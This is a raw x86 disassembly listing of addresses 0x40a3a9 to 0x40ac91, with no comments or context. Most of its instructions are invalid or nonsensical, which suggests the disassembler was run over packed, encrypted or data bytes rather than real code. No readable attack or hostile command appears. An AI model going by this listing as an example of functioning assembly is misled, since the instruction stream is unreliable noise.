  40a3a9:	add    BYTE PTR [eax],al
  40a3ab:	add    dh,ch
  40a3ad:	xchg   esp,eax
  40a3ae:	cld    
  40a3af:	mov    bl,0x1e
  40a3b1:	xchg   edi,eax
  40a3b2:	sbb    al,0xc5
  40a3b4:	sahf   
  40a3b5:	mov    ecx,0x183e90d5
  40a3ba:	test   al,0x7
  40a3bc:	mov    cs,WORD PTR [ecx]
  40a3be:	rol    DWORD PTR [esi],1
  40a3c0:	stos   DWORD PTR es:[edi],eax
  40a3c1:	or     DWORD PTR [esi+0x51a17e9d],edi
  40a3c7:	(bad)  
  40a3c8:	stc    
  40a3c9:	inc    DWORD PTR [eax-0x69]
  40a3cc:	xor    bh,BYTE PTR [edi-0x6cd3f518]
  40a3d2:	iret   
  40a3d3:	les    ebx,FWORD PTR [esi+0x21]
  40a3d6:	in     eax,dx
  40a3d7:	jo     0x40a42f
  40a3d9:	or     edx,esp
  40a3db:	inc    ebx
  40a3dc:	(bad)
  40a3df:	pushf  
  40a3e0:	ror    ebx,1
  40a3e2:	daa    
  40a3e3:	add    al,0xe9
  40a3e5:	or     ah,bh
  40a3e7:	sti    
  40a3e8:	push   ds
  40a3e9:	outs   dx,BYTE PTR ds:[esi]
  40a3ea:	ins    DWORD PTR es:[edi],dx
  40a3eb:	or     ch,BYTE PTR [esi]
  40a3ed:	sbb    BYTE PTR ds:0xd3092674,bh
  40a3f3:	add    edx,DWORD PTR [ebx+0x5558c100]
  40a3f9:	mov    edi,0x90e9be8
  40a3fe:	jmp    0x5567b586
  40a403:	or     bh,dh
  40a405:	hlt    
  40a406:	jmp    FWORD PTR [eax]
  40a408:	(bad)  
  40a409:	fmul   QWORD PTR [edi-0x67]
  40a40c:	push   edx
  40a40d:	mov    DWORD PTR [edx+0x26],ebx
	...
  40a423:	add    BYTE PTR [ebx],dh
  40a425:	cmc    
  40a426:	mov    edi,0x67b8ce95
  40a42b:	cmp    dh,0xbf
  40a42e:	(bad)  
  40a42f:	mov    eax,0x11079343
  40a434:	sahf   
  40a435:	add    al,0xff
  40a437:	(bad)  
  40a438:	and    ebp,DWORD PTR [edx-0x6f]
  40a43b:	test   BYTE PTR [eax+0x18],0x99
  40a43f:	pop    eax
  40a440:	inc    ebx
  40a441:	or     edi,edi
  40a443:	pop    esp
  40a444:	xor    DWORD PTR [ecx],ecx
  40a446:	jne    0x40a439
  40a448:	inc    edx
  40a449:	cld    
  40a44a:	mov    ss,esi
  40a44c:	inc    eax
  40a44d:	aaa    
  40a44e:	ret    0x3ae5
  40a451:	mov    bl,0x8a
  40a453:	aad    0xba
  40a455:	inc    ebx
  40a456:	in     al,dx
  40a457:	mov    dh,0x30
  40a459:	or     DWORD PTR [ebp-0x14fbed4],ecx
  40a45f:	xor    al,0x65
  40a461:	or     DWORD PTR [ebp-0xb],esi
  40a464:	inc    edx
  40a465:	cs arpl cx,bp
  40a468:	cmp    dh,ch
  40a46a:	mov    edi,0x34d7e6
  40a46f:	jmp    0x8185e5ae
  40a474:	cmp    eax,0xf9e90000
  40a479:	ret    0x76f3
  40a47c:	cmp    BYTE PTR [eax],al
  40a47e:	add    BYTE PTR [ebx],al
  40a480:	xor    eax,0x3ad2ff9a
  40a485:	call   0x0:0x6bff
	...
  40a49c:	ficom  WORD PTR [ebx]
  40a49e:	push   eax
  40a49f:	fs xchg esi,eax
  40a4a1:	or     al,0xf7
  40a4a3:	dec    esi
  40a4a4:	inc    eax
  40a4a5:	mov    al,0xfe
  40a4a7:	add    ch,al
  40a4a9:	sti    
  40a4aa:	(bad)  
  40a4ab:	jne    0x40a4e9
  40a4ad:	in     al,0xa3
  40a4af:	arpl   ax,sp
  40a4b1:	add    ecx,DWORD PTR [ebx]
  40a4b3:	shl    BYTE PTR [esi+eax*1+0x3d08ee8],0x0
  40a4bb:	push   0x402436
  40a4c0:	das    
  40a4c1:	ja     0x40a4d2
  40a4c3:	call   0x3f34df
  40a4c8:	mov    al,ds:0x558dcf84
  40a4cd:	lock idiv bh
  40a4d0:	scas   eax,DWORD PTR es:[edi]
  40a4d1:	push   ebx
  40a4d2:	push   ecx
  40a4d3:	call   0x3f353f
  40a4d8:	sub    DWORD PTR [esi-0x7800811],eax
  40a4de:	out    0xd,eax
  40a4e0:	adc    eax,edi
  40a4e2:	(bad)  
  40a4e3:	push   0xffffffa0
  40a4e5:	imul   esi,edx,0x3c
  40a4e8:	push   ecx
  40a4e9:	cld    
  40a4ea:	(bad)  
  40a4eb:	mov    ch,0xc0
  40a4ed:	lock (bad) 
  40a4ef:	jmp    FWORD PTR [edi-0x6f17f48a]
  40a4f5:	xchg   edi,eax
  40a4f6:	(bad)  
  40a4f7:	(bad)  
  40a4f8:	jmp    0xc0389082
  40a4fd:	clc    
  40a4fe:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  40a511:	add    BYTE PTR [eax],al
  40a513:	add    BYTE PTR [eax+esi*8+0x7760fffe],bh
  40a51a:	adc    ch,BYTE PTR [eax+0x51]
  40a51d:	add    ebp,edi
  40a51f:	mov    esi,0xf7ebb5bf
  40a524:	scas   eax,DWORD PTR es:[edi]
  40a525:	clc    
  40a526:	(bad)  
  40a527:	jne    0x40a541
  40a529:	jmp    0x40a4c1
  40a52b:	mov    dl,0x9f
  40a52d:	clc    
  40a52e:	(bad)  
  40a52f:	mov    ch,0x6c
  40a531:	lock (bad) 
  40a533:	(bad)  
  40a534:	cmp    ecx,eax
  40a536:	cmp    edx,DWORD PTR [eax-0x4af849f2]
  40a53c:	or     esi,eax
  40a53e:	pop    es
  40a53f:	(bad)  
  40a540:	dec    BYTE PTR [ebx-0x9]
  40a543:	(bad)  
  40a544:	ins    BYTE PTR es:[edi],dx
  40a545:	and    DWORD PTR [ebx],ebx
  40a547:	xor    dh,ch
  40a549:	aad    0x7
  40a54b:	jmp    FWORD PTR [eax+ebp*8-0xf2100f1]
  40a552:	push   edi
  40a553:	nop
  40a554:	(bad)  
  40a555:	in     eax,dx
  40a556:	pop    es
  40a557:	inc    ebp
  40a558:	sar    edi,1
  40a55a:	mov    esi,0x7fdc6fe
  40a55f:	jne    0x40a51e
  40a561:	lock or DWORD PTR [edx+0x39],esp
  40a565:	sbb    DWORD PTR [edx],edi
  40a567:	ret    0x193d
  40a56a:	scas   al,BYTE PTR es:[edi]
  40a56b:	mov    dl,BYTE PTR [ebp-0x5917c069]
  40a571:	and    eax,0x2cfc8d07
  40a576:	mov    ah,0xfe
	...
  40a58c:	add    al,0x9
  40a58e:	push   es
  40a58f:	jne    0x40a5c6
  40a591:	xor    DWORD PTR [ebx],esp
  40a593:	bound  edi,QWORD PTR [ecx]
  40a595:	sbb    edx,edi
  40a597:	mov    edi,0xe59446
  40a59c:	cmp    DWORD PTR [ecx],ebx
  40a59e:	ds inc ebp
  40a5a0:	popa   
  40a5a1:	sbb    BYTE PTR [ebx],al
  40a5a3:	add    BYTE PTR [ecx],bh
  40a5a5:	pop    esi
  40a5a6:	shl    ebx,0x56
  40a5a9:	adc    eax,0x18e30003
  40a5ae:	cdq    
  40a5af:	call   eax
  40a5b1:	sbb    BYTE PTR [ecx+0xfdbadff],bl
  40a5b7:	push   eax
  40a5b8:	les    edx,FWORD PTR [edi+ecx*1-0x4c68d109]
  40a5bf:	(bad)  
  40a5c0:	lods   al,BYTE PTR ds:[esi]
  40a5c1:	add    BYTE PTR [ecx+0x7],ah
  40a5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c5:	add    al,0x51
  40a5c7:	push   ecx
  40a5c8:	fwait
  40a5c9:	add    cl,ch
  40a5cb:	cli    
  40a5cc:	into   
  40a5cd:	mov    ebx,fs
  40a5cf:	sbb    al,0x18
  40a5d1:	add    ecx,ebp
  40a5d3:	add    edx,DWORD PTR [ecx-0x93aeee2]
  40a5d9:	push   es
  40a5da:	mov    esp,0x5a28d6f3
  40a5df:	pop    es
  40a5e0:	out    0xb0,al
  40a5e2:	jno    0x40a618
  40a5e4:	lods   al,BYTE PTR ds:[esi]
  40a5e5:	jnp    0x40a5fc
  40a5e7:	(bad)  
  40a5e9:	add    eax,0x38d6b1b9
  40a5ee:	jp     0x40a5f7
	...
  40a604:	(bad)  
  40a605:	ja     0x40a673
  40a607:	adc    al,0xc6
  40a609:	add    eax,0x70571bfe
  40a60e:	test   BYTE PTR [esi],0x23
  40a611:	add    BYTE PTR [ebx-0x26b459fd],al
  40a617:	push   cs
  40a618:	sahf   
  40a619:	add    eax,0x184290de
  40a61e:	or     eax,0x60058e73
  40a623:	adc    BYTE PTR [ebp+0x7e06c60d],0x4b
  40a62a:	int    0xe
  40a62c:	jbe    0x40a633
  40a62e:	sar    DWORD PTR [edi],0xd0
  40a631:	add    eax,0x8ca6faae
  40a636:	or     DWORD PTR [ecx+esi*4+0x560e917b],esi
  40a63d:	add    eax,0xd615096
  40a642:	mov    es,WORD PTR [esi]
  40a644:	push   ecx
  40a645:	call   FWORD PTR [ebx+0x6]
  40a648:	ds stc 
  40a64a:	test   al,0x8f
  40a64c:	jle    0x40a5e6
  40a64e:	(bad)  
  40a64f:	jmp    0xc3b6:0x1be153a
  40a656:	inc    eax
  40a657:	jmp    0x5728f193
  40a65c:	aas    
  40a65d:	add    eax,0x1d12dcff
  40a662:	cwde   
  40a663:	xchg   ebp,eax
  40a664:	aas    
  40a665:	add    eax,0xeb68
	...
  40a67a:	add    BYTE PTR [eax],al
  40a67c:	cmp    dl,BYTE PTR ds:0xc377d1be
  40a682:	inc    eax
  40a683:	jmp    0x3728f1bf
  40a688:	aas    
  40a689:	add    eax,0x1ce29cff
  40a68e:	adc    BYTE PTR [ebp+0x3f],0x5
  40a692:	push   0xbe153ae9
  40a697:	add    DWORD PTR [ebx],0x37e940c4
  40a69d:	dec    ebx
  40a69e:	call   0xff45e399
  40a6a3:	jl     0x40a657
  40a6a5:	sbb    al,0x68
  40a6a7:	xor    eax,0x7de8053f
  40a6ac:	and    al,0x5
  40a6ae:	(bad)  
  40a6af:	fiadd  WORD PTR [esi]
  40a6b1:	adc    al,0xf7
  40a6b3:	(bad)  
  40a6b4:	xor    al,0x18
  40a6b6:	mov    DWORD PTR [esi+0x3c],ebx
  40a6b9:	add    eax,0xd257cff
  40a6be:	(bad)  
  40a6bf:	mov    esi,0xb60b8b3c
  40a6c4:	mov    esi,0x3f8ce7fc
  40a6c9:	add    eax,0xfeea6ff
  40a6ce:	neg    DWORD PTR [esi+0x666d183c]
  40a6d4:	xor    al,0x5
  40a6d6:	jmp    DWORD PTR [esi*1-0x49ff0ee9]
  40a6dd:	cli    
  40a6de:	(bad)  
  40a6df:	inc    DWORD PTR [eax]
	...
  40a6f1:	add    BYTE PTR [eax],al
  40a6f3:	add    BYTE PTR ds:0x41b7e7fc,ch
  40a6f9:	cld    
  40a6fa:	dec    eax
  40a6fc:	ror    BYTE PTR [eax],cl
  40a6fe:	call   DWORD PTR [ebx+ebp*4-0x18]
  40a702:	add    ah,0x74
  40a705:	jmp    DWORD PTR [ecx+0x42]
  40a709:	std    
  40a70a:	je     0x40a714
  40a70c:	js     0x40a78b
  40a70e:	mov    edi,edi
  40a710:	ja     0x40a699
  40a712:	inc    esp
  40a713:	cld    
  40a714:	or     BYTE PTR [eax],al
  40a716:	add    bh,ch
  40a718:	fs retfw 0x913c
  40a71d:	jmp    DWORD PTR [edi-0x25]
  40a720:	aam    0x3e
  40a722:	(bad)  
  40a723:	(bad)  
  40a724:	lods   eax,DWORD PTR ds:[esi]
  40a725:	pop    es
  40a726:	out    0x47,eax
  40a728:	ins    BYTE PTR es:[edi],dx
  40a729:	std    
  40a72a:	(bad)  
  40a72b:	push   0x403833
  40a730:	aaa    
  40a731:	xor    esi,DWORD PTR [ecx+ebp*1-0x1f]
  40a735:	(bad)  
  40a736:	(bad)  
  40a737:	jne    0x40a6d1
  40a739:	out    0x8f,eax
  40a73b:	std    
  40a73c:	xchg   edi,eax
  40a73d:	cld    
  40a73e:	jcxz   0x40a795
  40a741:	aas    
  40a742:	jmp    DWORD PTR [edi-0x5e]
  40a745:	(bad)  
  40a746:	(bad)  
  40a747:	jg     0x40a7b0
  40a749:	jb     0x40a752
  40a74b:	call   0x3fa246
  40a750:	call   0x6081e349
  40a755:	add    DWORD PTR [bx+si],eax
	...
  40a76c:	pusha  
  40a76d:	jg     0x40a76e
  40a76f:	jne    0x40a7c9
  40a771:	out    0x5a,eax
  40a773:	(bad)  
  40a774:	xchg   edi,eax
  40a775:	cld    
  40a776:	addr16 aaa 
  40a778:	jne    0x40a7b8
  40a77a:	jmp    DWORD PTR [edi+0x39]
  40a77d:	pop    ss
  40a77e:	add    eax,DWORD PTR [eax]
  40a780:	mov    ecx,0x51078e72
  40a785:	rol    BYTE PTR ds:0x8d8236ff,1
  40a78b:	sti    
  40a78c:	cs add al,0xfb
  40a78f:	out    0x8e,eax
  40a791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a792:	add    edi,edi
  40a794:	lock (bad) 
  40a796:	(bad)  
  40a797:	jmp    FWORD PTR [ebp-0x72]
  40a79a:	push   ss
  40a79b:	inc    DWORD PTR [ebp+ebx*1-0x4e55e6e5]
  40a7a2:	add    ecx,DWORD PTR [ebx]
  40a7a4:	stc    
  40a7a5:	inc    esp
  40a7a6:	retf   0xa967
  40a7a9:	add    eax,edx
  40a7ab:	(bad)  
  40a7ac:	jle    0x40a76f
  40a7ae:	push   esp
  40a7af:	xchg   edx,eax
  40a7b0:	out    0xd1,al
  40a7b2:	mov    dl,0x4f
  40a7b4:	push   ecx
  40a7b5:	sbb    DWORD PTR [ebx],eax
  40a7b7:	out    dx,eax
  40a7b8:	xchg   edi,eax
  40a7b9:	jo     0x40a82b
  40a7bb:	cmp    eax,0xfeb31978
  40a7c0:	dec    esp
  40a7c1:	and    DWORD PTR [ebx],ebx
  40a7c3:	jne    0x40a74f
  40a7c5:	stc    
  40a7c6:	add    ebx,DWORD PTR [eax+0x21]
  40a7c9:	sbb    BYTE PTR [ebx],al
  40a7cb:	out    dx,eax
  40a7cc:	out    dx,eax
  40a7cd:	and    BYTE PTR [ecx+0x3d],0x0
	...
  40a7e1:	add    BYTE PTR [eax],al
  40a7e3:	add    al,bh
  40a7e5:	sbb    BYTE PTR [ebx-0x14eedb02],dh
  40a7eb:	pusha  
  40a7ec:	retf   0x321
  40a7ef:	call   0xff4342b0
  40a7f4:	jo     0x40a84c
  40a7f6:	or     al,0x0
  40a7f8:	in     al,0x8d
  40a7fa:	out    dx,eax
  40a7fb:	cmp    BYTE PTR [ebp+0x44],0x6e
  40a7ff:	add    bl,ah
  40a801:	cmc    
  40a802:	add    dh,BYTE PTR [ebp+0x31]
  40a805:	inc    ecx
  40a806:	mov    bl,0x8a
  40a808:	pop    esi
  40a809:	jmp    DWORD PTR [ebp+0x1303fd8d]
  40a80f:	push   ds
  40a810:	dec    esi
  40a811:	mov    eax,fs
  40a813:	jmp    0x40a7c2
  40a815:	add    cl,BYTE PTR [esi-0x7a212cfd]
  40a81b:	jns    0x40a85e
  40a81d:	sbb    BYTE PTR [edx+0x3],dh
  40a820:	add    al,BYTE PTR cs:[ebx]
  40a823:	and    BYTE PTR [esi],ah
  40a825:	mov    eax,fs
  40a827:	jmp    0x40a7e2
  40a829:	add    DWORD PTR [esi+0x3],esp
  40a82c:	push   ss
  40a82d:	mov    WORD PTR [ebx+eax*1-0x7c],ds
  40a831:	clc    
  40a832:	inc    eax
  40a833:	int    0xb3
  40a835:	add    DWORD PTR [esi-0x33],ecx
  40a838:	clc    
  40a839:	cld    
  40a83a:	call   0x9a556a97
  40a83f:	retf   0x9635
  40a842:	cmc    
  40a843:	inc    esp
  40a844:	cmp    DWORD PTR [eax],eax
  40a846:	jmp    0x40a84e
	...
  40a85b:	add    BYTE PTR [ecx],bh
  40a85d:	aad    0x41
  40a85f:	add    ecx,DWORD PTR [eax+edi*8+0x10]
  40a863:	aaa    
  40a864:	outs   dx,BYTE PTR ds:[esi]
  40a865:	add    cl,ch
  40a867:	mov    gs,WORD PTR [ebp-0x8]
  40a86a:	imul   edi,esp,0x6d78a38
  40a870:	mov    DWORD PTR [ebp+0x13],edi
  40a873:	push   es
  40a874:	pop    ss
  40a875:	jg     0x40a82a
  40a877:	pop    edi
  40a878:	add    eax,0x7669e38b
  40a87d:	inc    BYTE PTR [esp+eax*1-0x6a]
  40a881:	mov    ebp,esp
  40a883:	jmp    0x40a8f9
  40a885:	mov    eax,ds:0xb11103e8
  40a88a:	push   cs
  40a88b:	inc    ebp
  40a88c:	cmp    DWORD PTR [eax-0x7bf7b],ebx
  40a892:	rcr    BYTE PTR [ecx-0x49fffe3a],1
  40a898:	aaa    
  40a899:	inc    eax
  40a89a:	je     0x40a8e0
  40a89c:	cmp    cl,BYTE PTR [ebx-0x4ece59f9]
  40a8a2:	cmp    eax,0xc47d3528
  40a8a7:	in     eax,dx
  40a8a8:	aaa    
  40a8a9:	inc    eax
  40a8aa:	jne    0x40a8e0
  40a8ac:	cmp    ch,bl
  40a8ae:	pop    esi
  40a8af:	(bad)  
  40a8b0:	jge    0x40a8b2
  40a8b2:	mov    ds:0xffbf7a13,eax
  40a8b7:	imul   edi,DWORD PTR [ecx-0x6a],0x35283e
  40a8be:	jne    0x40a8b1
	...
  40a8d4:	cmp    ebp,ebx
  40a8d6:	push   edx
  40a8d7:	pop    ds
  40a8d8:	je     0x40a8da
  40a8da:	jmp    0x40a8ec
  40a8dc:	xchg   edi,eax
  40a8dd:	add    BYTE PTR [edx-0x18],ch
  40a8e0:	cmp    ecx,ebx
  40a8e2:	imul   eax,DWORD PTR [esi],0xd4ff007c
  40a8e8:	push   edi
  40a8e9:	ret    0xe940
  40a8ec:	mov    edi,0xfae20c3c
  40a8f1:	mov    WORD PTR [eax],fs
  40a8f3:	adc    DWORD PTR es:[esi+0x13aa83e],edx
  40a8fa:	adc    eax,0xffbf7882
  40a8ff:	imul   esi,esi,0xfdcfefc
  40a905:	ret    0xe940
  40a908:	cmp    ebx,0x69
  40a90b:	mov    dh,0xfd
  40a90d:	(bad)  
  40a90e:	(bad)  
  40a90f:	call   0xe92ba94e
  40a914:	std    
  40a915:	je     0x40a8da
  40a917:	inc    edx
  40a918:	cmp    BYTE PTR [esi],0x8
  40a91b:	jmp    0xeaa6cdd
  40a920:	cli    
  40a921:	(bad)  
  40a922:	(bad)  
  40a923:	push   DWORD PTR [edi+ebx*8]
  40a926:	(bad)  
  40a927:	xor    eax,0x40bf0a
  40a92c:	scas   eax,DWORD PTR es:[edi]
  40a92d:	call   0xfc51e79c
  40a932:	add    ah,0x64
  40a935:	call   DWORD PTR [ebx+edx*2]
	...
  40a94c:	outs   dx,BYTE PTR ds:[esi]
  40a94d:	mov    ebp,0x9255c6ff
  40a952:	ds inc ecx
  40a954:	push   eax
  40a955:	cld    
  40a956:	(bad)  
  40a957:	jmp    DWORD PTR [eax]
  40a959:	lds    edx,FWORD PTR [ebx-0x75]
  40a95c:	mov    esp,0x43f0c285
  40a961:	lea    eax,[ebx+0x8]
  40a964:	sbb    eax,esp
  40a966:	jb     0x40a973
  40a968:	mov    ds:0xe4000c7f,eax
  40a96d:	push   es
  40a96e:	cmp    BYTE PTR [eax],0x10
  40a971:	ja     0x40a97a
  40a973:	sub    edx,DWORD PTR [eax+0x5d]
  40a976:	leave  
  40a977:	ret    0x3e8
  40a97a:	cmp    BYTE PTR [eax],0xae
  40a97d:	ja     0x40a98f
  40a97f:	sub    ebp,0x6d
  40a982:	aas    
  40a983:	inc    ecx
  40a984:	rol    BYTE PTR [ebx],1
  40a986:	jne    0x40a98f
  40a988:	jmp    0x40a94d
  40a98a:	pop    ecx
  40a98b:	leave  
  40a98c:	and    cl,BYTE PTR [eax+eax*1]
  40a98f:	sub    al,0x81
  40a992:	je     0x40a9d2
  40a994:	pop    ebx
  40a995:	push   edi
  40a996:	or     al,0x4a
  40a998:	and    esp,esi
  40a99a:	add    DWORD PTR [ebx],ecx
  40a99c:	push   edx
  40a99d:	ja     0x40a9a5
  40a99f:	sub    DWORD PTR ds:0x9475010f,0x2c
  40a9a6:	shr    bl,0x44
  40a9a9:	add    DWORD PTR [ebp+0xc],ecx
  40a9ac:	or     eax,DWORD PTR [esi+0xc]
  40a9af:	add    eax,0x0
	...
  40a9c4:	cmp    ecx,ebp
  40a9c6:	push   es
  40a9c7:	add    BYTE PTR [ecx],bh
  40a9c9:	test   al,0xe2
  40a9cb:	add    DWORD PTR [ecx],ecx
  40a9cd:	rcr    DWORD PTR [ecx*4-0x74ad4192],1
  40a9d4:	or     al,0xe1
  40a9d6:	inc    esp
  40a9d7:	push   eax
  40a9d8:	pop    esi
  40a9d9:	xor    al,0x10
  40a9db:	push   edx
  40a9dc:	popa   
  40a9dd:	mov    esp,0x414efe9a
  40a9e2:	pop    ebp
  40a9e3:	leave  
  40a9e4:	jnp    0x40a9c7
  40a9e6:	add    ch,BYTE PTR [ebx]
  40a9e8:	bound  ecx,QWORD PTR [esi-0x3c9f38b]
  40a9ee:	or     ch,BYTE PTR [edx+0x39]
  40a9f1:	adc    eax,DWORD PTR [edi+edi*8]
  40a9f4:	dec    esp
  40a9f5:	push   ds
  40a9f6:	inc    edx
  40a9f7:	inc    ecx
  40a9f8:	cmp    DWORD PTR [edx-0x39],ebp
  40a9fb:	cmovb  ebp,DWORD PTR [ecx]
  40a9fe:	ja     0x40aa65
  40aa00:	shl    BYTE PTR [ebx+0x643569fe],0x46
  40aa07:	lock imul eax,DWORD PTR [ecx-0xa],0x6d45f68b
  40aa0f:	add    BYTE PTR [ebx+eiz*4-0x4419b00e],bh
  40aa16:	(bad)  
  40aa17:	inc    BYTE PTR [esi+eax*8+0x40]
  40aa1b:	inc    ecx
  40aa1c:	cmp    DWORD PTR [edx-0x39],ebp
  40aa1f:	or     eax,DWORD PTR [edx+0x29]
  40aa22:	jbe    0x40aa57
  40aa24:	mov    ah,0xab
  40aa26:	repnz add BYTE PTR [eax],0x0
	...
  40aa3a:	add    BYTE PTR [eax],al
  40aa3c:	inc    ecx
  40aa3d:	in     eax,0x2
  40aa3f:	je     0x40aa93
  40aa41:	jb     0x40aa86
  40aa43:	or     cl,bh
  40aa45:	cwde   
  40aa46:	jmp    0x818a:0xfef5b5b4
  40aa4d:	pop    ebx
  40aa4e:	inc    esi
  40aa4f:	lock xchg esi,eax
  40aa51:	call   FWORD PTR [eax+0xc]
  40aa54:	jmp    0x64da:0x910858fe
  40aa5b:	(bad)  
  40aa5c:	jg     0x40aac7
  40aa5e:	jmp    0x1930a7f3
  40aa63:	inc    DWORD PTR [ebp+0x5b]
  40aa66:	inc    DWORD PTR [ecx+edi*1-0x7d]
  40aa6a:	lods   al,BYTE PTR ds:[esi]
  40aa6b:	or     al,0xd3
  40aa6d:	add    BYTE PTR [esi-0x401aa87],ch
  40aa73:	pop    edx
  40aa74:	cmovno ebp,ecx
  40aa77:	cmp    BYTE PTR [edx+0x7],0x62
  40aa7b:	ret    
  40aa7c:	jecxz  0x40aa46
  40aa7e:	stos   BYTE PTR es:[edi],al
  40aa7f:	or     al,0x39
  40aa81:	push   ebx
  40aa82:	jb     0x40aa74
  40aa84:	das    
  40aa85:	je     0x40aa74
  40aa87:	(bad)  
  40aa88:	lods   eax,DWORD PTR ds:[esi]
  40aa89:	or     BYTE PTR [esi+0x19],dh
  40aa8c:	fwait
  40aa8d:	cmp    eax,0xc4ba0428
  40aa92:	lock push ebx
  40aa94:	push   cs
  40aa95:	je     0x40aa84
  40aa97:	dec    BYTE PTR [ebp+0x5f195608]
  40aa9d:	cmp    eax,0x3a8
	...
  40aab2:	add    BYTE PTR [eax],al
  40aab4:	mov    edx,0x858af0c4
  40aab9:	adc    BYTE PTR [eax+0x2],dh
  40aabc:	add    edi,0x5339102a
  40aac2:	(bad)  
  40aac3:	lock mov ebx,0x45ff10c4
  40aac9:	or     al,0x11
  40aacb:	add    ebp,DWORD PTR [eax-0x6f4ea03]
  40aad1:	jae    0x40aab8
  40aad3:	int3   
  40aad4:	js     0x40aae6
  40aad6:	jmp    0x114cd0d9
  40aadb:	loopne 0x40aab1
  40aadd:	std    
  40aade:	push   ebp
  40aae0:	xor    eax,eax
  40aae2:	jae    0x40aac9
  40aae4:	test   DWORD PTR [edi+0x748fe90f],edi
  40aaea:	adc    al,0xde
  40aaec:	add    DWORD PTR [eax],edx
  40aaee:	call   0xff3de49f
  40aaf3:	loop   0x40ab6f
  40aaf5:	je     0x40aafb
  40aaf7:	mov    al,0x78
  40aaf9:	or     eax,0x3cf75100
  40aafe:	inc    ecx
  40aaff:	jmp    0x287e85d6
  40ab04:	cmp    eax,0x4f7f8be8
  40ab09:	dec    BYTE PTR [edx]
  40ab0b:	test   eax,0x27680cc1
  40ab10:	(bad)  
  40ab11:	add    BYTE PTR ds:[ecx],al
  40ab14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab15:	ds inc ecx
  40ab17:	jmp    0x40ab1c
	...
  40ab2c:	and    bh,BYTE PTR [eax-0x6a]
  40ab2f:	jle    0x40ab58
  40ab31:	or     al,al
  40ab33:	out    0xb6,al
  40ab35:	lods   eax,DWORD PTR ds:[esi]
  40ab36:	add    cl,ch
  40ab38:	cmp    cl,BYTE PTR [ebx-0x2959abc]
  40ab3e:	je     0x40ab2d
  40ab40:	pop    es
  40ab41:	adc    al,0x4e
  40ab43:	push   ss
  40ab44:	je     0x40ab46
  40ab46:	and    DWORD PTR ds:0xf6c00942,0xffffffc1
  40ab4d:	xchg   ebp,eax
  40ab4e:	add    cl,ch
  40ab50:	cmp    ch,BYTE PTR [edx+0x0]
  40ab53:	fs jno 0x40ab4e
  40ab56:	dec    edi
  40ab57:	ret    
  40ab58:	xlat   BYTE PTR ds:[ebx]
  40ab59:	fs fsubrp st(6),st
  40ab5c:	jne    0x40ab5e
  40ab5e:	call   DWORD PTR [esi+eax*8-0x40eb03]
  40ab65:	add    BYTE PTR ds:[edx+0x7e],ch
  40ab69:	adc    BYTE PTR [ebx],cl
  40ab6b:	add    BYTE PTR [eax+0xe],ah
  40ab6e:	test   DWORD PTR [edx-0x6f],ebp
  40ab71:	add    BYTE PTR [eax],al
  40ab73:	call   FWORD PTR ds:0xaa15fdf9
  40ab79:	cmp    eax,0xc8230041
  40ab7e:	add    al,BYTE PTR [ebx+0x5746798]
  40ab84:	jns    0x40abdd
  40ab86:	add    DWORD PTR [eax],eax
  40ab88:	pusha  
  40ab89:	lea    eax,[ebx-0xc]
  40ab8c:	push   eax
  40ab8d:	push   0x0
  40ab8f:	inc    DWORD PTR [eax]
	...
  40aba1:	add    BYTE PTR [eax],al
  40aba3:	add    BYTE PTR ds:0xa714e6fc,ch
  40aba9:	cli    
  40abaa:	std    
  40abab:	or     esp,DWORD PTR [eax+0x6139840a]
  40abb1:	add    BYTE PTR [eax],al
  40abb3:	and    DWORD PTR ds:0xcc0efef8,0x2a
  40abba:	add    DWORD PTR [eax],eax
  40abbc:	and    BYTE PTR [eax-0x7bd8ffca],al
  40abc2:	and    al,0x1
  40abc4:	adc    BYTE PTR [eax],al
  40abc6:	push   eax
  40abc7:	mov    edi,DWORD PTR ds:0xb85240f8
  40abcd:	push   0xffffff8b
  40abcf:	call   DWORD PTR [edi+0x68458956]
  40abd5:	std    
  40abd6:	jae    0x40abcc
  40abd8:	addr16 jae 0x40abc3
  40abdb:	push   edx
  40abdc:	js     0x40ab71
  40abde:	mov    edi,edi
  40abe0:	ja     0x40aba7
  40abe2:	inc    ebx
  40abe3:	lock sar bh,1
  40abe6:	(bad)  
  40abe7:	dec    DWORD PTR [edi]
  40abe9:	inc    ebx
  40abea:	in     al,dx
  40abeb:	add    al,ah
  40abed:	(bad)  
  40abee:	inc    DWORD PTR [edx+0x413f65d5]
  40abf4:	sar    bh,1
  40abf6:	je     0x40ac4a
  40abf8:	cmp    DWORD PTR [ecx-0x1707bfb1],eax
  40abfe:	jmp    0x1150:0x2e90d29
  40ac05:	xchg   esi,eax
  40ac06:	inc    edx
  40ac07:	inc    ecx
	...
  40ac1c:	cmp    edx,esi
  40ac1e:	jne    0x40ac08
  40ac20:	mov    eax,ds:0x39005f1d
  40ac25:	out    dx,al
  40ac26:	ret    0x2173
  40ac29:	push   ecx
  40ac2a:	pop    edx
  40ac2b:	inc    eax
  40ac2c:	clc    
  40ac2d:	call   0xe955ba1c
  40ac32:	add    dl,BYTE PTR [eax-0x1f]
  40ac35:	push   ds
  40ac36:	inc    esp
  40ac37:	inc    ecx
  40ac38:	cmp    DWORD PTR [edx+0x7951e875],edi
  40ac3e:	pop    esi
  40ac3f:	add    BYTE PTR [ecx],bh
  40ac41:	faddp  st(2),st
  40ac43:	jae    0x40ac50
  40ac45:	adc    DWORD PTR [edx+0x40],esp
  40ac48:	clc    
  40ac49:	call   0xe9239e38
  40ac4e:	add    dl,BYTE PTR [eax-0x5f]
  40ac51:	pop    es
  40ac52:	inc    esp
  40ac53:	inc    ecx
  40ac54:	cmp    DWORD PTR [edx+0x5511e875],eax
  40ac5a:	pop    esi
  40ac5b:	add    BYTE PTR [ecx],bh
  40ac5d:	jle    0x40ac79
  40ac5f:	push   0x4329a2
  40ac64:	and    DWORD PTR [ecx+0x58],eax
  40ac67:	add    BYTE PTR [ecx],bh
  40ac69:	mov    ecx,0xa8796b6a
  40ac6e:	add    bh,bh
  40ac70:	ins    BYTE PTR es:[edi],dx
  40ac71:	inc    ecx
  40ac72:	jmp    0x40aced
  40ac74:	mov    ecx,gs
  40ac76:	add    cl,BYTE PTR [ebx]
  40ac78:	stc    
  40ac79:	mov    bl,0x6c
  40ac7b:	lea    esi,[ebp+edi*1+0x53]
  40ac7f:	push   0x0
	...
  40ac91:	add    BYTE PTR [eax],al
